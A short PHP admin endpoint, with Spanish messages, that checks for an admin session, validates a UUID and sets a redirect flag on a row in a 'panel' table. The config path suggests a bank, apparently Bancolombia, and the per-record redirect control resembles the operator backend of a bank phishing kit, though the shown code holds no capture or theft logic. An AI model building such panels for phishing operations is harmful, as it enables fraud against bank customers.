<?php
require_once '../bancol/config.php';

if (!isset($_SESSION['admin_logged_in'])) {
    header("HTTP/1.1 403 Forbidden");
    exit("Acceso no autorizado");
}

$conn = getConnection();
$uuid = $conn->real_escape_string($_GET['id'] ?? '');

// Validar UUID
if (empty($uuid) || !preg_match('/^[a-f0-9\-]{36}$/i', $uuid)) {
    header("HTTP/1.1 400 Bad Request");
    exit("ID inválido");
}

// Actualizar BD y verificar cambios
$stmt = $conn->prepare("UPDATE  panel SET redirect_flag = 1 WHERE id = ?");
$stmt->bind_param("s", $uuid);
$stmt->execute();

if ($stmt->affected_rows === 0) { // <--- Verificar filas afectadas
    header("HTTP/1.1 404 Not Found");
    exit("Registro no encontrado");
}

$stmt->close();
$conn->close();

echo "1"; // Respuesta simple para JavaScript
exit();